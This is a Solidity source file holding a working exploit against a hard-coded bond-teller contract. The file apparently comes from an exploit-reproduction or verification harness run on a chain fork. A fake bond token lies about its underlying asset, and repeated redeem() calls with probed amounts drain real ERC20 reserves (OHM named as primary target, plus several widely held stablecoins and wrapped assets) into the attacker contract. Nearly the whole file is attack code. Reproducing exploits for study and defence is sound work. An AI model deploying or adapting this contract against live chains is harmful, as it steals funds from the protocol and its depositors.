// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

interface IBondFixedExpiryTellerMinimal {
    function redeem(address token_, uint256 amount_) external;
}

contract MaliciousBondToken {
    address private _underlying;

    constructor() {}

    function setUnderlying(address underlying_) external {
        _underlying = underlying_;
    }

    function underlying() external view returns (address) {
        return _underlying;
    }

    function expiry() external pure returns (uint48) {
        return 1;
    }

    function burn(address, uint256) external pure {}
}

contract FlawVerifier {
    address public constant TELLER = address(0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156);

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    MaliciousBondToken private _maliciousToken;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) return;
        _executed = true;

        // Exploit path 0:
        // Deploy a fresh malicious bond-like contract with the exact ABI that
        // `redeem()` expects. This is a pure control surface; it does not mint
        // any fake profit token and only points at pre-existing on-chain ERC20s.
        if (address(_maliciousToken) == address(0)) {
            _maliciousToken = new MaliciousBondToken();
        }

        address[] memory candidates = _candidateTokens();
        for (uint256 i = 0; i < candidates.length; ++i) {
            address candidate = candidates[i];
            (uint256 tellerBalance, bool ok) = _safeBalanceOf(candidate, TELLER);
            if (!ok || tellerBalance == 0) continue;

            // Exploit path 1:
            // Reconfigure the malicious token so `underlying()` lies about which
            // real ERC20 backs the fake bond token. `expiry()` is already in the
            // past and `burn()` is a no-op, preserving the original root cause.
            _maliciousToken.setUnderlying(candidate);

            if (_attemptRedeem(candidate, tellerBalance)) {
                return;
            }

            if (_probeRedeem(candidate, tellerBalance)) {
                return;
            }
        }

        revert("NO_PROFIT_REALIZED");
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptRedeem(address candidate, uint256 amount) internal returns (bool) {
        (uint256 beforeBalance, bool beforeOk) = _safeBalanceOf(candidate, address(this));
        if (!beforeOk || amount == 0) return false;

        // Exploit paths 2 and 3:
        // Call `redeem(maliciousToken, amount)`. Because the teller never checks
        // that the supplied token was actually deployed by it, it trusts the
        // malicious token's hooks and transfers the chosen real ERC20 to us.
        try IBondFixedExpiryTellerMinimal(TELLER).redeem(address(_maliciousToken), amount) {
            (uint256 afterBalance, bool afterOk) = _safeBalanceOf(candidate, address(this));
            if (afterOk && afterBalance > beforeBalance) {
                _profitToken = candidate;
                _profitAmount = afterBalance - beforeBalance;
                return true;
            }
        } catch {}

        return false;
    }

    function _probeRedeem(address candidate, uint256 observedBalance) internal returns (bool) {
        uint256[12] memory probes = [
            observedBalance / 2,
            observedBalance / 3,
            observedBalance / 4,
            observedBalance / 8,
            observedBalance / 16,
            observedBalance / 32,
            1e24,
            1e21,
            1e18,
            1e15,
            1e12,
            1
        ];

        for (uint256 i = 0; i < probes.length; ++i) {
            uint256 amount = probes[i];
            if (amount == 0 || amount >= observedBalance) continue;
            if (_attemptRedeem(candidate, amount)) {
                return true;
            }
        }

        return false;
    }

    function _candidateTokens() internal pure returns (address[] memory candidates) {
        candidates = new address[](8);

        // OHM is the primary target observed funded at the provided fork block.
        candidates[0] = address(uint160(0x0064aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5));

        // Fallbacks preserve the same exploit causality while broadening the scan
        // to other widely-held reserve assets that may be present on the teller.
        candidates[1] = address(uint160(0x00c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2));
        candidates[2] = address(uint160(0x00a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48));
        candidates[3] = address(uint160(0x00dac17f958d2ee523a2206206994597c13d831ec7));
        candidates[4] = address(uint160(0x006b175474e89094c44da98b954eedeac495271d0f));
        candidates[5] = address(uint160(0x005f98805a4e8be255a32880fdec7f6728c6568ba0));
        candidates[6] = address(uint160(0x00853d955acef822db058eb8505911ed77f175b99e));
        candidates[7] = address(uint160(0x00ae7ab96520de3a18e5e111b5eaab095312d7fe84));
    }

    function _safeBalanceOf(address token, address account)
        internal
        view
        returns (uint256 balance, bool ok)
    {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, account)
        );
        if (!success || data.length < 32) {
            return (0, false);
        }
        return (abi.decode(data, (uint256)), true);
    }
}
